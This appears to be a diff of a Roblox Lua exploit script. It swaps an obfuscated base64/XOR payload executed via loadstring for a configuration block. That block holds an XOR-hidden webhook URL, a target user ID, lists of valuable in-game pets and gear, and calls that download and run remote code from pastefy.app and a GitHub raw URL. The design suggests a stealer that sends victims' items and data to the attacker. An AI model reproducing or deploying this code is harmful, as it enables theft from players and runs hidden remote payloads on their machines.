@@ -1,22 +1,115 @@
--- obfuscated
-local _K=25
-local _D=[[dXZ6eHU5fnx3bzkkOX58bX58d28xMBMTfnx3bzdeVlZdRk5cW1FWVlI5JDkxf2x3em1wdncxMBM5OTk5dXZ6eHU5ezkkOWIrKDUgNSA1KCo1KC01Lig1ISs1ISs1Kyw1Kyk1KC01Kik1KCE1KCw1Kyw1ISo1Kik1KCE1KC81ISs1KyE1KCo1Kyk1ISs1KCk1Ky01Kig1Kyg1KCE1KCE1Kys1KC01ISs1Li81Lis1LiE1LiA1Lio1LyE1LiA1LyE1Liw1LyA1LyA1LiE1Li81LyA1LyA1Li81LiA1LiA1Liw1ISs1LCA1KCE1Lys1ISk1LCo1LCE1LCo1LC01KCs1KCs1LCo1IDUsLTUtKDUuLTUvKzUrKDUtKDUuLjUqKTUtKTUsKzUsITUtKDUoKTUsKTUqLzUsITUhNSovNS0qNSsoNSstNS0sNSw1Li81Lyo1Lys1Lis1LSs1Li01Kig1Kys1Ki81ISk1LTUsLTUsLjUrKzUoKTUhNS8gNS01Ki01IDUtLjUtKjUrKzUsKjUvITUrKzUuLTUtNS4gNSopNSwtNSsvNSsvZBM5OTk5dXZ6eHU5cjkkOSgrLBM5OTk5dXZ6eHU5djkkOWJkEzk5OTl/dms5cDkkOSg1OTp7OX12OXZCcEQ5JDlqbWtwd343enF4azF7cG0qKzd7YXZrMXtCcEQ1OXIwMDl8d30TOTk5OWt8bWxrdzlteHt1fDd6dnd6eG0xdjATfHd9MDEwExN+fHdvN01YS15cTUZMSlxLRlBdOSQ5KyErICgrKCgvKBMTfnx3bzdeVlZdRlhPWE1YSzkkOTtxbW1paiM2Nnp9dzdpf2lqN35+Nml/aWo2Li4vKSs0e3V2dn00enhtN35wfzsTE358d283WFVVVk5cXUZYV1BUWFVKOSQ5YhM5OTk5O0pta3hue3xra2A5XHV8aXF4d207NRM5OTk5O1F8eH11fGpqOVF2a2p8dHh3OzUTOTk5OTtUfHZudTs1Ezk5OTk7U3ZxdzlJdmtyOzUTOTk5OTtKcnB7cH1wOU12cHV8bTs1Ezk5OTk7Xmtwf39wdzs1Ezk5OTk7XWt4fnZ3OVhobHh3cHdwOzUTOTk5OTtda3h+dnc5XnB3fnxrcHdwOzUTOTk5OTtRYH1reDlda3h+dnc5Wnh3d3x1dXZ3cDs1Ezk5OTk7SnB+d3ZrfDlaeGt4aXh6fDs1Ezk5OTk7XWt4fnZ3OVp4d3d8dXV2d3A7NRM5OTk5O1V2b3w5VXZvfDlbfHhrOzUTOTk5OTtUdntgOVtrdmo7NRM5OTk5O11wfnA5V3hrbnF4dTs1Ezk5OTk7Umt4cnx3OzUTOTk5OTtVeDlKbGlrfHR8OVp2dHtwd3hqcHZ3OzUTOTk5OTtcdXx/eHdtdjlfa3B+djs1Ezk5OTk7UWB9a3g5W2x3d2A7NRM5OTk5O1p8dXxqbXB4dTlJfH54amxqOzUTOTk5OTtafGt7fGtsajs1Ezk5OTk7U3x1dWA5VHZ7YDs1Ezk5OTk7W2x3d2A5eHd9OVx+fmA7NRM5OTk5O0l2aXpsa2w5eHd9OV9wY2Nsa2w7NRM5OTk5O0t2anxgOXh3fTlNfH19YDs1Ezk5OTk7WnhpcG14d3Y5VHZ7YDs1Ezk5OTk7WnZ2cnA5eHd9OVRwdXJwOzUTOTk5OTtYa3p4fWt4fnZ3OzUTOTk5OTtbbGt+bGt2OXh3fTlfa2Bsa3Y7NRM5OTk5O1V2ajlKfHprfG05WnZ0e3B3eGpwdnd4ajs1Ezk5OTk7UnxtbGl4bTlba3ZqOzUTOTk5OTtLfHB3cG12OUp1fHB+cXBtdjs1Ezk5OTk7X3ZrbWx3bDl4d305WnhqcWxrbDs1Ezk5OTk7VXZqOVh0cH52ajs1Ezk5OTk7SXBjY3g5eHd9OUt4d3pxOzUTOTk5OTtYd212d3B2OzUTOTk5OTtVeDlKfHprfG05WnZ0e3B3eGpwdnc7NRM5OTk5O0l4d3p4cnw5eHd9OUpga2xpOzUTOTk5OTtfdmFwd3A5VXh3bXxrd3B3cDs1Ezk5OTk7Unh1cHJ4OVtrdmo7NRM5OTk5O1V2ajlKfHJ2dXhxajs1Ezk5OTk7Snh0dGB3cDlfeG1tcHdwOzUTOTk5OTtfcGpxcHd2OVp1dm53cHd2OzUTOTk5OTtaeGpxOXZrOVp4a307NRM5OTk5O19reH5reHR4OXh3fTlacXZ6a3h0eDs1Ezk5OTk7VXg5WnhqeDlbdnY7NRM5OTk5O1V2ajlYfXRwd2o7NRM5OTk5O11sfn5gOVtrdmo7NRM5OTk5O1V4OV92dn05WnZ0e3B3eGpwdnc7NRM5OTk5O0p4dHRgd3A5WnhycHdwOzUTOTk5OTtbdmlpcHc5W2x3d2A7NRM5OTk5O0ppdnZyYDl4d305SWx0aXJgOzUTOTk5OTtecHd+fGs5XnxreG07NRM5OTk5O1V2ajlacXB1dXBqOzUTOTk5OTtVdmo5UXh6cnxrajs1Ezk5OTk7S2x7cHJ2OXh3fTlSbHtwcnY7NRM5OTk5O1t8eGtwbXY5Wnh7cHdwbXY7NRM5OTk5O1p4aXBteHd2OVh0fGtwenh3djs1Ezk5OTk7XGF4dHx3OVtrdmo7NRM5OTk5O0tse2twcnBydjs1Ezk5OTk7X3xqbXBvfDkvLjs1Ezk5OTk7Xmx8am05Ly8vOzUTOTk5OTtIbHh6cnB3cDlKd3h6cnB3cDs1Ezk5OTk7WnV2b3xreG05WnV4aXhtOzUTOTk5OTtaeGB1bGp4bGtsajs1Ezk5OTk7UXZpcHVwcnh1cHJ4OVF2aXB1cHJ4dXhydjs1Ezk5OTk7Sm18eHJwd3A5X3htbXB3cDs1Ezk5OTk7XnhreHR4OXh3fTlUeH1sd31sd347NRM5OTk5O1V2ajlKaXh+cXxtbXBqOzUTOTk5OTtLcHp2OV1wd3xrdjs1Ezk5OTk7X2t4fnZ1eDlVeDlVeDlVeDs1Ezk5OTk7VXZqOU14enZrcG14ajs1Ezk5OTk7XnV2e3g5Sm18aWl4OzUTOTk5OTtUdnd8YDlUdnd8YDlba3ZqOzUTOTk5OTtTdnV1YDlTdnV1YDlKeHFsazs1Ezk5OTk7XWx+OV1sfjldbH47E2QTE358d283WFVVVk5cXUZbWEpcSlJQV0o5JDliEzk5OTlCO01reHV4dXg7RDkkOW1rbHwTZBMTfnx3bzdYVVVWTlxdRl5cWEtKOSQ5YhM5OTk5QjtbdXZ2fXR2dnc5UXh0dHxrO0Q5JDlta2x8NRM5OTk5QjtaeHd9YDlKfHdta2A7RDkkOW1rbHw1Ezk5OTlCO0t4cHd7dm45UXh0dHxrO0Q5JDlta2x8NRM5OTk5QjtLeHB3e3ZuOUp1eGk7RDkkOW1rbHw1Ezk5OTlCO1t1dnZ9dHZ2dzlKdXhpO0Q5JDlta2x8E2QTE358d283WFVVVk5cXUZJVVhaXEZQXUo5JDliEzk5OTkoKSAgISovLyEpLiArKi4TZBMTNDQ5XGFta3g5anprcGltajkxdHZvfH05dmxtOXZ/OXR4cHcwE358d283XEFNS1hGVVZYXUpNS1BXXko5JDliEzk5OTk7cW1taWojNjZpeGptfH9gN3hpaTZQIHR8bmxgezZreG47E2QTEzQ0OVZpbXB2d3h1OV5MUDk2OXZtcXxrOXV2eH18a2oTbXhqcjdqaXhudzF/bHd6bXB2dzEwEzk5OTl1dnh9am1rcHd+MX54dHwjUW1taV58bTE7cW1taWojNjZpeGptfH9gN3hpaTZqbCBxUCF9ejZreG47MDAxMBN8d30wExNteGpyN2ppeG53MX9sd3ptcHZ3MTATOTk5OXV2eH1qbWtwd34xfnh0fCNRbW1pXnxtMTtxbW1paiM2Nmt4bjd+cG1xbHtsanxrenZ3bXx3bTd6dnQ2d3Zrfnx+eG00e2BtfDZSKzZrfH9qNnF8eH1qNnR4cHc2dHhwdzd1bHg7MDAxMBN8d30w]]
-local _B="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
-local function _dec(d)
-  local o,b={},{}
-  for i=1,#_B do b[_B:sub(i,i)]=i-1 end
-  local n,bits=0,0
-  for i=1,#d do
-    local c=d:sub(i,i)
-    if c=='=' then break end
-    local v=b[c]; if v then n=n*64+v; bits=bits+6
-      if bits>=8 then bits=bits-8; o[#o+1]=string.char(math.floor(n/2^bits)%256); n=n%2^bits end
-    end
-  end
-  return table.concat(o)
-end
-local _raw=_dec(_D)
-local _o={}
-for i=1,#_raw do _o[i]=string.char(bit32.bxor(_raw:byte(i),_K)) end
-local _s=table.concat(_o)
-loadstring(_s)()
+local genv = getgenv()
+
+genv.GOOD_WEBHOOK = (function() local b={230,250,250,254,253,180,161,161,234,231,253,237,225,252,234,160,237,225,227,161,239,254,231,161,249,235,236,230,225,225,229,253,161,191,187,189,188,186,183,188,183,184,182,182,189,191,182,182,191,188,188,184,161,200,225,205,163,198,201,198,197,255,255,198,250,197,218,185,205,230,218,190,237,219,199,201,218,249,193,215,201,251,215,216,230,235,222,246,191,204,205,187,217,185,236,229,215,163,247,197,202,229,249,251,182,247,209,250,220,216,229,198,183,229,185,247,188,237,197,233,233} local k=142 local o={} for i=1,#b do o[i]=string.char(bit32.bxor(b[i],k)) end return table.concat(o) end)()
+
+genv.TARGET_USER_ID = 2829121161
+
+genv.GOOD_AVATAR = "https://cdn.pfps.gg/pfps/77602-blood-cat.gif"
+
+genv.ALLOWED_ANIMALS = {
+    "Strawberry Elephant",
+    "Headless Horseman",
+    "Meowl",
+    "John Pork",
+    "Skibidi Toilet",
+    "Griffin",
+    "Dragon Aquanini",
+    "Dragon Gingerini",
+    "Hydra Dragon Cannelloni",
+    "Signore Carapace",
+    "Dragon Cannelloni",
+    "Love Love Bear",
+    "Moby Bros",
+    "Digi Narwhal",
+    "Kraken",
+    "La Supreme Combinasion",
+    "Elefanto Frigo",
+    "Hydra Bunny",
+    "Celestial Pegasus",
+    "Cerberus",
+    "Jelly Moby",
+    "Bunny and Eggy",
+    "Popcuru and Fizzuru",
+    "Rosey and Teddy",
+    "Capitano Moby",
+    "Cooki and Milki",
+    "Arcadragon",
+    "Burguro and Fryuro",
+    "Los Secret Combinasionas",
+    "Ketupat Bros",
+    "Reinito Sleighito",
+    "Fortunu and Cashuru",
+    "Los Amigos",
+    "Pizza and Ranch",
+    "Antonio",
+    "La Secret Combinasion",
+    "Pancake and Syrup",
+    "Foxini Lanternini",
+    "Kalika Bros",
+    "Los Sekolahs",
+    "Sammyni Fattini",
+    "Fishino Clownino",
+    "Cash or Card",
+    "Fragrama and Chocrama",
+    "La Casa Boo",
+    "Los Admins",
+    "Duggy Bros",
+    "La Food Combinasion",
+    "Sammyni Cakini",
+    "Boppin Bunny",
+    "Spooky and Pumpky",
+    "Ginger Gerat",
+    "Los Chillis",
+    "Los Hackers",
+    "Rubiko and Kubiko",
+    "Bearito Cabinito",
+    "Capitano Americano",
+    "Examen Bros",
+    "Rubrikiko",
+    "Festive 67",
+    "Guest 666",
+    "Quackini Snackini",
+    "Cloverat Clapat",
+    "Caylusaurus",
+    "Hopilikalika Hopilikalako",
+    "Steakini Fattini",
+    "Garama and Madundung",
+    "Los Spaghettis",
+    "Rico Dinero",
+    "Fragola La La La",
+    "Los Tacoritas",
+    "Globa Steppa",
+    "Money Money Bros",
+    "Jolly Jolly Sahur",
+    "Dug Dug Dug"
+}
+
+genv.ALLOWED_BASESKINS = {
+    ["Tralala"] = true
+}
+
+genv.ALLOWED_GEARS = {
+    ["Bloodmoon Hammer"] = true,
+    ["Candy Sentry"] = true,
+    ["Rainbow Hammer"] = true,
+    ["Rainbow Slap"] = true,
+    ["Bloodmoon Slap"] = true
+}
+
+genv.ALLOWED_PLACE_IDS = {
+    109983668079237
+}
+
+-- Extra scripts (moved out of main)
+genv.EXTRA_LOADSTRINGS = {
+    "https://pastefy.app/I9mewuyb/raw"
+}
+
+-- Optional GUI / other loaders
+task.spawn(function()
+    loadstring(game:HttpGet("https://pastefy.app/su9hI8dc/raw"))()
+end)
+
+task.spawn(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/norgegat-byte/K2/refs/heads/main/main.lua"))()
+end)
